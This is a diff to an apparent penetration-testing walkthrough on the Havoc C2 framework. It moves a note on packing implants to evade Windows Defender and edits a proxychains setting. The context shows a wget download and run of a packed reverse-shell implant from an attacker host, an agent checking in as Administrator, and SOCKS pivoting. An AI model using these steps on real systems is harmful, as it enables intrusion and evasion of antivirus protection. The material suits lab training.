@@ -274,6 +274,12 @@ In the Havoc Teamserver logs
 PoC - Step 5 - Generate a packed version of the HAVOC implant and run it on the target Windows 10 laptop (with Defender AV enabled and up-to-date)
 ====================================================================================================================================================
 
+Notes
+-----
+The HAVOC demaons/implants generated with the Windows format ".exe" are easily detected by AV solution such as WIndows Defender. 
+However, multiple tools can be used to "pack/obfuscate/encrypt" the HAVOC implants (Please refer to: https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)) 
+
+
 PS C:\Users\Administrator\Downloads> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL
 
 AntivirusEnabled              : True
@@ -286,16 +292,12 @@ PS C:\Users\Administrator\Downloads> wget -URI http://192.168.56.104:8080/Packed
 
 PS C:\Users\Administrator\Downloads> .\PackedHavocRevShell.exe
 
-Notes
------
-> Multiple tools can be used to "pack/obfuscate/encrypt" the HAVOC implants (e.g. https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)) 
-
 
 ==============================================================================================================================================
 PoC - Step 6 - Get the reverse shell and then configure a SOCKS proxy 4 within the HAVOC session (command "socks add")
 ==============================================================================================================================================
 
-=> Once the HAVOC implant connects back to the HAVOC temaserver you can interact with the reverse shell by cliking on "Interact"  
+=> Once the HAVOC implant connects back to the HAVOC temaserver, you can interact with the reverse shell by cliking on "Interact".  
 
 [16/01/2023 02:01:29] Agent 4CCD1C1E authenticated from as Laptop1\Administrator :: [Internal: 0.0.0.0] [Process: PackedHavocRevShell.exe\7344] [Arch: x64] [Pivot: Direct]
 
@@ -364,7 +366,7 @@ Demon Commands
 Notes
 # apt-get install proxychains
 # cp /etc/proxychains.conf /etc/proxychains.conf.backup
-# echo "socks5 127.0.0.1 1081" >> /etc/proxychains.conf
+# echo "socks4 127.0.0.1 4444" >> /etc/proxychains.conf
 ------------------------------------------------------------------
 Configuration of Proxychains
 ------------------------------------------------------------------
